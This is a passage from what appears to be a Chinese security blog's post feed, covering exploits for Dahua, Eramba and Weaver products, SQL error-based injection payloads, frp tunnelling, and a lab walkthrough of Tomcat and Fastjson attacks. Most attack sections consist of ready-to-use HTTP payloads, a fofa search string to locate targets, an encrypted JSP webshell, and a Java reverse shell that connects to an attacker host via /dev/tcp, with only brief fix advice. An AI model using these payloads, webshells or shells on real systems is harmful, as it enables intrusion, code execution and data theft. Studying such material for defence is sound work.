title="大华智慧园区综合管理平台"></a>大华智慧园区综合管理平台</h2><p>​大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。 该设备开放了文件上传功能，但未在上传的文件类型、大小、格式、路径等方面进行严格的限制和过滤，导致攻击者可以通过构造恶意文件并上传到设备上。</p><h5 id="fofa特征搜索："><a href="#fofa特征搜索：" class="headerlink" title="fofa特征搜索："></a>fofa特征搜索：</h5><p>“&#x2F;WPMS&#x2F;asset&#x2F;lib&#x2F;gridster&#x2F;“</p><p><img src="/2023/08/19/1/2.png"></p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;emap&#x2F;devicePoint_addImgIco?hasSubsystem&#x3D;true HTTP&#x2F;1.1Host: 127.0.0.1User-Agent: python-requests&#x2F;2.26.0Accept-Encoding: gzip, deflateAccept: *&#x2F;*Connection: Keep-AliveContent-Length: 232Content-Type: multipart&#x2F;form-data; boundary&#x3D;f3aeb22be281d77542546a2f71e20982--f3aeb22be281d77542546a2f71e20982Content-Disposition: form-data; name&#x3D;&quot;upload&quot;; filename&#x3D;&quot;a.jsp&quot;Content-Type: application&#x2F;octet-streamContent-Transfer-Encoding: binary23332143454e--f3aeb22be281d77542546a2f71e20982--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/1/3.png"></p><h5 id="shell连接地址："><a href="#shell连接地址：" class="headerlink" title="shell连接地址："></a>shell连接地址：</h5><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;upload&#x2F;emap&#x2F;society_new&#x2F;返回地文件名.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Eramba任意代码执行漏洞"><a href="#Eramba任意代码执行漏洞" class="headerlink" title="Eramba任意代码执行漏洞"></a>Eramba任意代码执行漏洞</h2><p>影响版本：Enterprise and Community edition &lt;&#x3D; 3.19.1</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;settings&#x2F;download-test-pdf?path&#x3D;ip%20a; HTTP&#x2F;1.1Host: [redacted]Cookie: translation&#x3D;1; csrfToken&#x3D;1l2rXXwj1D1hVyVRH%2B1g%2BzIzYTA3OGFiNWRjZWVmODQ1OTU1NWEyODM2MzIwZTZkZTVlNmU1YjY%3D; PHPSESSID&#x3D;14j6sfroe6t2g1mh71g2a1vjg8User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;111.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: de,en-US;q&#x3D;0.7,en;q&#x3D;0.3Accept-Encoding: gzip, deflateReferer: https:&#x2F;&#x2F;[redacted]&#x2F;settingsUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1Te: trailersConnection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="泛微-HrmCareerApplyPerView-SQL注入漏洞"><a href="#泛微-HrmCareerApplyPerView-SQL注入漏洞" class="headerlink" title="泛微 HrmCareerApplyPerView SQL注入漏洞"></a>泛微 HrmCareerApplyPerView SQL注入漏洞</h2><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;pweb&#x2F;careerapply&#x2F;HrmCareerApplyPerView.jsp?id&#x3D;1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7 HTTP&#x2F;1.1Host: 127.0.0.1:7443User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit&#x2F;605.1.15 (KHTML,like Gecko)Accept-Encoding: gzip, deflateConnection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入报错函数</title>
      <link href="/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/"/>
      <url>/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入报错函数"><a href="#sql注入报错函数" class="headerlink" title="sql注入报错函数"></a>sql注入报错函数</h1><h2 id="updataexml报错函数"><a href="#updataexml报错函数" class="headerlink" title="updataexml报错函数"></a>updataexml报错函数</h2><p>updatexml（）有三个参数<br>以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，<br>但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串）<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>分析完三个参数能明白为什么会有报错信息了<br>例如：</p><pre class="line-numbers language-none"><code class="language-none">lili’+and+updatexml(1,concat(0x7e,(user()，0x7e),1)   lili&#39;+and+updatexml(1,concat(0x7e,(select+group_concat(username)+from+users),0x7e),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/image-20230528232858852.png"></p><h2 id="extractvalue报错函数"><a href="#extractvalue报错函数" class="headerlink" title="extractvalue报错函数"></a>extractvalue报错函数</h2><p>函数extractValue()包含俩个参数<br>第一参数 XML文档对象名称，第二参数路径</p><pre class="line-numbers language-none"><code class="language-none">lili&#39; and extractvalue(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;))) --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="floor报错函数"><a href="#floor报错函数" class="headerlink" title="floor报错函数"></a>floor报错函数</h2><p>rand()函数：随机返回0~1间的小数</p><p>floor()函数：小数向下取整数。向上取整数ceiling()</p><p>concat_ws()函数：将括号内数据用第一个字段连接起来（和concat差不多）</p><p>group by：分组语句，常用于结合统计函数，根据一个或多列，对结果进行整合</p><p>as：别名</p><p>count函数：汇总统计数量</p><p>limit：这里用于显示指定行数</p><pre class="line-numbers language-none"><code class="language-none">select count(*),concat_ws(&#39;~&#39;,(select table_name),floor(rand(0)*2)) as a from information_schema.tables where table_schema&#x3D;&quot;pikachu&quot; group by a;  &#x2F;&#x2F;读取当前数据库的表名&#x2F;&#x2F;把concat_ws部分代码取一个别名 a ，在使用group by 对a进行分组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/image-20230528192251286-1692439261286.png"> </p><pre class="line-numbers language-none"><code class="language-none">select count(*),concat_ws(&#39;~&#39;,(select column_name),floor(rand(0)*2)) as a from information_schema.columns where table_name&#x3D;&quot;users&quot; group by a;  &#x2F;&#x2F;读取当前数据库的users表中的字段<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/image-20230528192203109.png"></p><pre class="line-numbers language-none"><code class="language-none">select count(*),concat_ws(&#39;~&#39;,(select username),floor(rand(0)*2)) as a from users group by a;&#x2F;&#x2F;读取当前数据库的账号select count(*),concat_ws(&#39;~&#39;,(select password),floor(rand(0)*2)) as a from users group by a;&#x2F;&#x2F;读取当前数据的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/image-20230528192541662.png"></p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;-1&#39; union select 1,count(*),concat_ws(&#39;~&#39;,((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;security&quot;)),floor(rand(0)*2)) as a from information_schema.columns group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/image-20230529125332673.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>frp内网穿透</title>
      <link href="/2023/08/19/frp/"/>
      <url>/2023/08/19/frp/</url>
      
        <content type="html"><![CDATA[<h1 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h1><h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><p>服务端：kali linux&#x2F;windows</p><p>客户端：kali linux&#x2F;linux&#x2F;windows（如果是windows的话客户端必须要下载frp的windows版本）</p><p>服务端：物理机IP</p><p>客户端：文件里填写物理机得IP地址，新开监控端口</p><h2 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h2><h4 id="服务端：frps"><a href="#服务端：frps" class="headerlink" title="服务端：frps"></a>服务端：frps</h4><pre class="line-numbers language-none"><code class="language-none">[common]#  共同配置，必需有该配置（请勿修改该代理名）bind_addr &#x3D; 192.168.129.16#  绑定的 IP,默认是127.0.0.1bind_port &#x3D; 7000#  服务端监听的端口max_pool_count&#x3D;1    # 最多能有多少个frpc链接上来<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/frp/frp1.png"> </p><h4 id="启动服务端：frps-exe-c-frps-ini"><a href="#启动服务端：frps-exe-c-frps-ini" class="headerlink" title="启动服务端：frps.exe -c frps.ini"></a>启动服务端：frps.exe -c frps.ini</h4><p><img src="/2023/08/19/frp/frp2.png"></p><h4 id="客户端：frpc配置客户端的socks5代理"><a href="#客户端：frpc配置客户端的socks5代理" class="headerlink" title="客户端：frpc配置客户端的socks5代理"></a>客户端：frpc配置客户端的socks5代理</h4><pre class="line-numbers language-none"><code class="language-none">[common]server_add &#x3D; 192.168.129.16  #  服务端 IP（需和服务端的 IP 配置为一致）server_port &#x3D; 7000    #  服务端端口（需和服务端的端口配置为一致）          [plugin_socks]                      type &#x3D; tcp                  remote_port &#x3D; 8899          plugin &#x3D; socks5            plugin_user &#x3D; admin         plugin_passwd &#x3D; passwd      use_encryption &#x3D; true       use_compression &#x3D; true     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="启动客户端：fpc-exe-c-frpc-ini"><a href="#启动客户端：fpc-exe-c-frpc-ini" class="headerlink" title="启动客户端：fpc.exe  -c  frpc.ini"></a>启动客户端：fpc.exe  -c  frpc.ini</h4><p> <img src="/2023/08/19/frp/frp3.png"></p><h1 id="proxifer联合frp使用"><a href="#proxifer联合frp使用" class="headerlink" title="proxifer联合frp使用"></a>proxifer联合frp使用</h1><h4 id="首先使用proxifer设置代理"><a href="#首先使用proxifer设置代理" class="headerlink" title="首先使用proxifer设置代理"></a>首先使用proxifer设置代理</h4><p><img src="/2023/08/19/frp/pr2.png"> </p><h4 id="检查是否代理成功"><a href="#检查是否代理成功" class="headerlink" title="检查是否代理成功"></a>检查是否代理成功</h4><p><img src="/2023/08/19/frp/pr3.png"> </p><h5 id="设置代理规则，以下图片的设置是允许将我的电脑的全部流量代理到在192-168-52-网段中进行内网穿透"><a href="#设置代理规则，以下图片的设置是允许将我的电脑的全部流量代理到在192-168-52-网段中进行内网穿透" class="headerlink" title="设置代理规则，以下图片的设置是允许将我的电脑的全部流量代理到在192.168.52.*网段中进行内网穿透"></a>设置代理规则，以下图片的设置是允许将我的电脑的全部流量代理到在192.168.52.*网段中进行内网穿透</h5><p><img src="/2023/08/19/frp/pr1.png"> </p><h4 id="此时我可以跨网段访问内网的网站"><a href="#此时我可以跨网段访问内网的网站" class="headerlink" title="此时我可以跨网段访问内网的网站"></a>此时我可以跨网段访问内网的网站</h4><p><img src="/2023/08/19/frp/pr4.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>靶场复现</title>
      <link href="/2023/08/19/images1/"/>
      <url>/2023/08/19/images1/</url>
      
        <content type="html"><![CDATA[<h1 id="靶场复现"><a href="#靶场复现" class="headerlink" title="靶场复现"></a>靶场复现</h1><h2 id="step1：tomcat-put协议文件上传漏洞"><a href="#step1：tomcat-put协议文件上传漏洞" class="headerlink" title="step1：tomcat put协议文件上传漏洞"></a>step1：tomcat put协议文件上传漏洞</h2><h3 id="漏洞概述："><a href="#漏洞概述：" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>当 Tomcat运行在Windows或者Linux操作系统，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求上传任意文件，包括JSP类型的木马。</p><h3 id="漏洞影响版本："><a href="#漏洞影响版本：" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>Apache Tomcat 7.0.0 - 7.0.81</p><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>抓包，修改方式为OPTIONS，查看是否允许PUT方法。</p><p><img src="/2023/08/19/images1/tomcat-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01.png"></p><p>修改方式为PUT，上传jsp木马,返回包显示201即上传成功。</p><p>数据包如下：</p><pre class="line-numbers language-none"><code class="language-none">PUT &#x2F;test.jsp&#x2F; HTTP&#x2F;1.1Host: 192.168.88.111:8080Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;96.0.4664.93 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: closeContent-Length: 542AAAAA&lt;%@page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k&#x3D;&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c&#x3D;Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;bbbb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/tomcat-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02.png"></p><p>“&#x2F;”在文件名中的命名是非法的，所以在数据包中上传test.jsp&#x2F;，到Linux中会去掉“&#x2F;”这个符号以此来绕过检测，上传木马文件。</p><p>通过冰蝎连接木马</p><p><img src="/2023/08/19/images1/tomcat-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A03.png"></p><h3 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h3><ul><li>升级tomcat的版本到7.0.81以上</li><li>到conf&#x2F;web.xml配置文件中修改readonly的值为true或则直接删除readonly</li></ul><h2 id="step2：tomcat-ajp协议漏洞"><a href="#step2：tomcat-ajp协议漏洞" class="headerlink" title="step2：tomcat ajp协议漏洞"></a>step2：tomcat ajp协议漏洞</h2><h3 id="漏洞概述：-1"><a href="#漏洞概述：-1" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>2020年2月20日，国家信息安全漏洞共享平台(CNVD)发布关于Apache Tomcat的安全公告，Apache Tomcat文件包含漏洞(CNVD-2020-10487，对应CVE-2020-1938)。Tomcat AJP协议由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。</p><h3 id="漏洞影响版本：-1"><a href="#漏洞影响版本：-1" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><h3 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>tomcat的serverl.xml对ajp的开放状态，如果此时你的防火墙也开放了对应的8009端口，就可以被攻击者利用此漏洞读取任意文件，若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。。</p><pre class="line-numbers language-none"><code class="language-none">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.88.48  -p 8009   -f  WEB-INF&#x2F;server.xmlpython2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.88.48  -p 8009   -f  index.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/1.png"></p><h3 id="修复方案：-1"><a href="#修复方案：-1" class="headerlink" title="修复方案："></a>修复方案：</h3><ul><li><p>将Tomcat立即升级到9.0.31、8.5.51或7.0.100版本进行修复。</p></li><li><p>禁用AJP协议</p><p>编辑 &#x2F;conf&#x2F;server.xml，找到如下行： 将此行注释掉(也可删掉该行)：</p><ul><li><p>配置secret来设置AJP协议的认证凭证。</p></li><li><p>在ajp协议中指定可访问的ip地址，配置address&#x3D;“ip地址”</p><pre class="line-numbers language-none"><code class="language-none">&lt;Connector protocol&#x3D;&quot;AJP&#x2F;1.3&quot;              port&#x3D;&quot;8009&quot;              address&#x3D;&quot;ip地址&quot;              redirectPort&#x3D;&quot;8443&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h2 id="step3：tomcat弱口令密码爆破"><a href="#step3：tomcat弱口令密码爆破" class="headerlink" title="step3：tomcat弱口令密码爆破"></a>step3：tomcat弱口令密码爆破</h2><h3 id="漏洞概述：-2"><a href="#漏洞概述：-2" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>抓一下tomcat登陆管理界面的数据包，可以看出，其认证方式是在http的请求<a href="https://so.csdn.net/so/search?q=header&spm=1001.2101.3001.7020">header</a>中添加一个字段为 Authorization，这个字段的值是 “Basic base64(username:password)”，因此在暴力破解时，只需要在请求包中添加该字段即可。</p><h3 id="漏洞影响版本：-2"><a href="#漏洞影响版本：-2" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>全版本存在</p><h3 id="漏洞复现：-2"><a href="#漏洞复现：-2" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>通过tomcat主页面，点击Manager App登录管理页面，在登录框中输入用户名密码，bp抓包。</p><p><img src="/2023/08/19/images1/2.png"></p><p>2.通过burpsuite抓取登录请求报文（用户名密码采用base64编码，用户名:密码  格式传输）</p><p><img src="/2023/08/19/images1/3.png"></p><p>3.bp设置参数进行爆破，第一个占位添加usernames。</p><p><img src="/2023/08/19/images1/4.png"></p><p>4.为第二个占位添加字符“:”。</p><p><img src="/2023/08/19/images1/5.png"></p><p>5.为第三个占位添加你的password字典。</p><p><img src="/2023/08/19/images1/6.png"></p><p>6.添加base64加密方式。</p><p><img src="/2023/08/19/images1/7.png"></p><p>7.爆破成功(tomcat&#x2F;tomcat)</p><p><img src="/2023/08/19/images1/8.png"></p><h3 id="修复方案：-2"><a href="#修复方案：-2" class="headerlink" title="修复方案："></a>修复方案：</h3><ul><li><p>将默认账号密码注释掉，修改成强密码。</p></li><li><p>代码里修改密码爆破的次数，一旦超过次数就会锁定账号无法登录。</p><pre class="line-numbers language-none"><code class="language-none">&lt;Realm className&#x3D;&quot;org.apache.catalina.realm.LockOutRealm&quot; failureCount&#x3D;&quot;填写密码爆破的次数限制&quot; lockOutTime&#x3D;&quot;0&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将tomcat的版本升级到6.0以上。</p></li></ul><h2 id="step4-tomcat后台war部署后门getshell漏洞"><a href="#step4-tomcat后台war部署后门getshell漏洞" class="headerlink" title="step4:tomcat后台war部署后门getshell漏洞"></a>step4:tomcat后台war部署后门getshell漏洞</h2><h3 id="漏洞概述：-3"><a href="#漏洞概述：-3" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>tomcat存在管理后台进行应用部署管理，管理员只需要上传一个war格式的文件就可以发布到网站。war包是用来进行Web开发时一个网站项目下的所有代码,包括前台HTML&#x2F;CSS&#x2F;JS代码,以及后台JavaWeb的代码。 War包 可以放在Tomcat下的webapps或word目录,当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。</p><h3 id="漏洞影响版本：-3"><a href="#漏洞影响版本：-3" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>tomcat的全部版本</p><h3 id="漏洞复现：-3"><a href="#漏洞复现：-3" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>1.登录后台界面找到上传点。</p><p><img src="/2023/08/19/images1/9.png"></p><p>2.制作war包上传</p><ul><li><p>将jsp木马文件压缩成zip文件再修改后缀</p></li><li><p>将后门文件打包到war包，需本地配置java环境</p><pre class="line-numbers language-none"><code class="language-none">jar -cvf war.war “shell.jsp”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>3.getshell</p><p>上传war包后，会自动解压到网站根目录下&#x2F;shell（你的war包名字）&#x2F;shell.jsp（你的后门名字），通过c刀等工具连接，getshell。</p><p><img src="/2023/08/19/images1/10.png"></p><p>验证木马是否上传成功</p><p><img src="/2023/08/19/images1/11.png"></p><p><img src="/2023/08/19/images1/12.png"> </p><p>4.冰蝎连接</p><p><img src="/2023/08/19/images1/13.png"></p><h3 id="修复方案：-3"><a href="#修复方案：-3" class="headerlink" title="修复方案："></a>修复方案：</h3><ul><li>1、在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</li><li>2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME&#x2F;conf&#x2F;web.xml文件设置锁定机制和时间超时限制。</li><li>3、以及针对manager-gui&#x2F;manager-status&#x2F;manager-script等目录页面设置最小权限访问限制。</li></ul><h2 id="step5-Fastjson反序列化漏洞"><a href="#step5-Fastjson反序列化漏洞" class="headerlink" title="step5:Fastjson反序列化漏洞"></a>step5:Fastjson反序列化漏洞</h2><h3 id="漏洞概述：-4"><a href="#漏洞概述：-4" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。</p><h3 id="漏洞影响版本：-4"><a href="#漏洞影响版本：-4" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>fastjson&lt;&#x3D;1.2.24</p><h3 id="漏洞复现：-4"><a href="#漏洞复现：-4" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>工具准备：Exploit.java、marshalsec-0.0.3-SNAPSHOT-all.ja</p><p>漏洞复现步骤：python搭建http服务——marshalsec开启监听转发——nc开启监听接收shell——攻击——反弹成功：</p><p>1.burp抓包，改post请求，利用DNSlog判断漏洞是否存在。</p><pre class="line-numbers language-none"><code class="language-none">POC：&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;sfvyzg.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B01.png"></p><p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B02.png" alt=" "></p><ol start="2"><li><h5 id="编写EXP，将里面的ip改为反弹shell的ip，文件命名为Exploit-java，并用javac编辑成Exploit-class。"><a href="#编写EXP，将里面的ip改为反弹shell的ip，文件命名为Exploit-java，并用javac编辑成Exploit-class。" class="headerlink" title="编写EXP，将里面的ip改为反弹shell的ip，文件命名为Exploit.java，并用javac编辑成Exploit.class。"></a>编写EXP，将里面的ip改为反弹shell的ip，文件命名为Exploit.java，并用javac编辑成Exploit.class。</h5><pre class="line-numbers language-none"><code class="language-none">import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader;public class Exploit&#123;    public Exploit() throws Exception &#123;        Process p &#x3D; Runtime.getRuntime().exec(new String[]&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.xx&#x2F;1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);        InputStream is &#x3D; p.getInputStream();        BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(is));        String line;        while((line &#x3D; reader.readLine()) !&#x3D; null) &#123;            System.out.println(line);        &#125;        p.waitFor();        is.close();        reader.close();        p.destroy();    &#125;    public static void main(String[] args) throws Exception &#123;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">javac Exploit.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B03.png"> </p><h5 id="3-python搭建临时的http服务-我这里用的python3"><a href="#3-python搭建临时的http服务-我这里用的python3" class="headerlink" title="3.python搭建临时的http服务(我这里用的python3)"></a>3.python搭建临时的http服务(我这里用的python3)</h5><pre class="line-numbers language-none"><code class="language-none">python -m http.server 8083<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B04.png"></p><h5 id="4-利用marshalsec开启监听转发。"><a href="#4-利用marshalsec开启监听转发。" class="headerlink" title="4.利用marshalsec开启监听转发。"></a>4.利用marshalsec开启监听转发。</h5><pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;192.168.88.219:8083&#x2F;#Exploit 9999 Listening on 0.0.0.0:9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B05.png"></p><h5 id="5-nc监听反弹shell。"><a href="#5-nc监听反弹shell。" class="headerlink" title="5.nc监听反弹shell。"></a>5.nc监听反弹shell。</h5><p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B06.png"></p><h5 id="6-开始构造payload进行攻击。"><a href="#6-开始构造payload进行攻击。" class="headerlink" title="6.开始构造payload进行攻击。"></a>6.开始构造payload进行攻击。</h5><pre class="line-numbers language-none"><code class="language-none">&#123;    &quot;name&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;x&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.88.219:9999&#x2F;Exploit&quot;,        &quot;autoCommit&quot;:true    &#125; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B07.png"></p></li></ol><p>7.反弹shell成功。</p><p><img src="/2023/08/19/images1/fastjson%E5%A4%8D%E7%8E%B08.png"></p><h3 id="修复方案：-4"><a href="#修复方案：-4" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1.升级fastjson版本。</p><h2 id="step6-ActiveMQ反序列化漏洞"><a href="#step6-ActiveMQ反序列化漏洞" 